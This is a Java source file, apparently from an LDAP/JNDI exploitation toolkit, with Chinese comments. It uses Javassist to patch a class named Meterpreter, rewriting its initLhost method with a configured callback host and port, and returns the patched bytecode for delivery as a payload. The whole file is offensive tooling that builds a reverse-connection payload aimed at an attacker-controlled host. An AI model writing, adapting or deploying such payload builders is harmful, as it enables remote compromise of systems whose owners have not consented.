package com.feihong.ldap.utils;

import com.feihong.ldap.template.Meterpreter;
import javassist.*;

import java.io.*;

public class ClassByteChange {

    public static void main(String[] args) {
        try {
            update(Meterpreter.class);
        } catch (NotFoundException e) {
            e.printStackTrace();
        } catch (CannotCompileException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    //动态获取.class
    public static byte[] update(Class clazz) throws NotFoundException, CannotCompileException, IOException {

        File dir=new File("");
        String ap=dir.getAbsolutePath();
        ap=ap+File.separatorChar+"data";
        ClassPool cPool = new ClassPool(true);

        //设置class文件的位置
        cPool.insertClassPath(ap);

        cPool.importPackage("java.io.DataInputStream");
        cPool.importPackage("java.io.InputStream");
        cPool.importPackage("java.net.Socket;");
        cPool.importPackage("java.io.OutputStream");
        cPool.importPackage("java.util.HashMap");
        //获取该class对象
        CtClass cClass = cPool.get("Meterpreter");
        //获取到对应的方法
        CtMethod cMethodHost = cClass.getDeclaredMethod("initLhost");

        cMethodHost.setBody("{        this.host = \""+Config.rhost+"\";\n" +
                "        this.port = \""+Config.rport+"\";}");

        //替换原有的文件
        cClass.writeFile(ap);
        InputStream in= new FileInputStream(ap+File.separatorChar+"Meterpreter.class");
        byte[] bytes = new byte[1024];
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        int len = 0;
        while((len = in.read(bytes)) != -1){
            baous.write(bytes, 0 , len);
        }

        in.close();
        baous.close();

        return baous.toByteArray();


    }
}
